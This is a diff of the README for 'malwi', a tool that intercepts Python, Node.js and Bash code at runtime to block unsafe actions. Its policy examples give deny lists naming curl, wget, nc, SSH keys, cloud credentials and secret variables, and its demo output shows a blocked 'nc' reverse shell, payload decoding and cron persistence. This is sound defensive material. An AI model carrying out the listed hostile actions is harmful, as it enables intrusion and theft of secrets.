@@ -10,7 +10,7 @@
 
 Advanced cyberattacks threaten critical infrastructure, digital sovereignty, and the freedom of societies. `malwi` intercepts Python, Node.js and Bash code at runtime, blocking unauthorized network calls and sensitive file access before damage is done. Includes curated policies built from supply-chain security research.
 
-**Compatibility**: Python 3.10&ndash;3.14 · Node.js 18&ndash;25 · Bash 4.4&ndash;5.3 · macOS ([⚠️ SIP](#macos-system-integrity-protection)) &amp; Linux · arm64 &amp; x86_64
+**Compatibility**: Python 3.10&ndash;3.14 · Node.js 18&ndash;25 · Bash 4.4&ndash;5.3 · macOS ([⚠️ SIP](#macos-system-integrity-protection-sip)) &amp; Linux · arm64 &amp; x86_64
 
 </div>
 
@@ -111,7 +111,7 @@ The agent is loaded via `DYLD_INSERT_LIBRARIES` (macOS) or `LD_PRELOAD` (Linux) 
 
 ## Policies
 
-Write policies in YAML. A minimal policy can be just a few lines:
+Write policies in YAML to control what `malwi` allows, denies, warns about, or prompts for review:
 
 ```yaml
 version: 1
@@ -126,73 +126,11 @@ envvars:
   deny: ["*SECRET*", "AWS_*"]
 ```
 
-Each section controls a different layer — runtime functions, commands, network, files, environment variables. A full policy:
-
-```yaml
-version: 1
-
-# Runtime function rules — intercept calls inside Node.js/Python
-nodejs:
-  allow: [dns.lookup, net.connect, fetch, "http.request", "https.request"]
-  deny: [eval, vm.runInContext, "child_process.exec"]
-
-python:
-  deny: [os.system, os.popen, ctypes.CDLL]
-  warn: [subprocess.run, subprocess.Popen.__init__]
-
-# Command execution — controls what child processes can be spawned
-commands:
-  allow: [node, git, npm]
-  deny: [curl, wget, ssh, nc, "*sudo*", "python*", perl]
-  review: [sudo]            # prompt user before allowing
-
-# Network — URL patterns, domain patterns, protocol restrictions
-network:
-  allow:
-    - "registry.npmjs.org/**"
-    - "api.example.com/**"
-    - "127.0.0.1:*/**"
-  deny:
-    - "169.254.169.254/**"   # block cloud metadata (SSRF)
-    - "metadata.google.internal/**"
-  warn: ["*.onion", "*.i2p"] # flag anonymity networks
-  protocols: [https, http, wss, ws]
-
-# File access — protect credentials and sensitive paths
-files:
-  deny: ["~/.ssh/**", "~/.aws/**", "*.pem", "*.key", "*id_rsa*"]
-
-# Environment variables — prevent secret exfiltration
-envvars:
-  deny: ["*SECRET*", "*PASSWORD*", "AWS_*", "GITHUB_*", DYLD_INSERT_LIBRARIES]
-  warn: ["*TOKEN*", "*API_KEY*", "OPENAI_*"]
-
-# Native C/system symbols
-symbols:
-  deny: [getpass, crypt]
-```
-
-### Mode keys
-
-| Key | Effect |
-|-----|--------|
-| `allow` | Explicitly permit |
-| `deny` | Block the operation |
-| `review` | Prompt user before allowing |
-| `warn` | Log a warning, allow |
-| `log` | Log silently, allow |
-| `noop` | Suppress from output |
-
-### Policy management
-
 ```bash
-$ malwi p                    # list all policy files
-$ malwi p reset              # rewrite all from built-in templates
-$ malwi p npm-install        # write a single policy
-$ malwi x -p my-policy.yaml -- node app.js  # use a custom policy
+$ malwi x -p policy.yaml -- node app.js
 ```
 
-See [POLICY.md](POLICY.md) for the full reference.
+See [POLICY.md](POLICY.md) for the full reference — sections, mode keys, pattern syntax, network auto-classification, constrained rules, and auto-policies.
 
 ## Auto-policies
 
@@ -252,7 +190,7 @@ $ malwi x -- pip install flask
 `curl | bash` runs whatever the server sends. Legitimate installers need curl and package managers, so those stay allowed — but the script shouldn't spawn interpreters, install cron jobs, encode data for exfiltration, or open raw sockets. Privilege escalation (sudo) prompts for approval.
 
 ```bash
-$ malwi x -- bash install.sh
+$ curl -fsSL https://www.canvascomputing.org/install-demo.sh | malwi x -- bash
 [malwi] denied: crontab -e                              # persistence via cron
 [malwi] denied: base64 -d /tmp/payload                  # obfuscated payload
 [malwi] denied: nc example.com 4444                     # reverse shell
@@ -261,21 +199,12 @@ $ malwi x -- bash install.sh
 
 ## macOS System Integrity Protection (SIP)
 
-macOS SIP prevents `DYLD_INSERT_LIBRARIES` from loading into binaries in paths: `/System`, `/usr`, `/bin`, `/sbin`, `/var`, `/Applications`. Binaries in `/usr/local`, `/opt`, and `~` are not SIP-protected.
+macOS SIP prevents `DYLD_INSERT_LIBRARIES` from loading into binaries under certain paths.
 
-```bash
-$ which bash
-/usr/local/bin/bash   # works
-/bin/bash             # blocked by SIP
-
-$ which python3
-/opt/homebrew/bin/python3   # works
-/usr/bin/python3            # blocked by SIP
-
-$ which node
-/usr/local/bin/node   # works
-/usr/bin/node         # blocked by SIP
-```
+| SIP | Paths |
+|--|-------|
+| ✅ `malwi` works here: not SIP protected | `/usr/local`, `/opt`, `~` |
+| **⚠️ SIP-protected** | `/System`, `/usr`, `/bin`, `/sbin`, `/var`, `/Applications` |
 
 
 ## Development
